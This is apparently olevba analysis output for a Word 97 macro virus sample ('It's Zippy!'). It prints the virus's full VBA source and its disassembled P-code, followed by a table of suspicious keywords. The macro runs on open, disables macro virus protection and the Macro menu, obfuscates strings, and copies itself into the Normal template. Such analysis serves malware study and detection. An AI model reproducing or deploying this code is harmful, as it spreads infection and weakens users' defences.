olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.av
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.av - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo ldr
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): vx = 1: xv = 4: x = 0
xrt = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
xst = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If xst > Sgn(x) And xrt > Sgn(x) Then GoTo ldr
If xst = Sgn(x) Then
    Set czy = NormalTemplate.VBProject.VBComponents
    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
    hst.Item(Cos(Atn(CInt(1)))).Name = czy.Item(Cos(Atn(CInt(1)))).Name
    hst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
End If
If xrt = Sgn(x) Then Set czy = ActiveDocument.VBProject.VBComponents
czy.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With czy.Item(Cos(Atn(CInt(1)))).codemodule
    For j = Abs(vx) To Abs(xv)
    .deletelines Abs(vx)
        Next j
End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
If xst = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If xst = Sgn(x) Then czy.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If xst = Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ldr:
If xst <> Sgn(x) And xrt = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Zippy! by Virus :) Smile

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.av
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3707 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError ldr 
' Line #2:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St vx 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	St xv 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' Line #3:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St xrt 
' Line #4:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St xst 
' Line #5:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Gt 
' 	Ld xrt 
' 	Ld x 
' 	FnSgn 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo ldr 
' 	EndIf 
' Line #6:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set czy 
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #9:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Gt 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "It's Zippy!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld czy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #11:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld xrt 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set czy 
' 	EndIf 
' Line #14:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld czy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #15:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld czy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #16:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld vx 
' 	FnAbs 
' 	Ld xv 
' 	FnAbs 
' 	For 
' Line #17:
' 	Ld vx 
' 	FnAbs 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #18:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndWith 
' Line #20:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #22:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #23:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vx 
' 	FnAbs 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld czy 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #24:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	Ld xrt 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #25:
' 	Label ldr 
' Line #26:
' 	Ld xst 
' 	Ld x 
' 	FnSgn 
' 	Ne 
' 	Ld xrt 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #27:
' 	EndSub 
' 	QuoteRem 0x0008 0x0022 "WM97/It's Zippy! by Virus :) Smile"
' Line #28:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

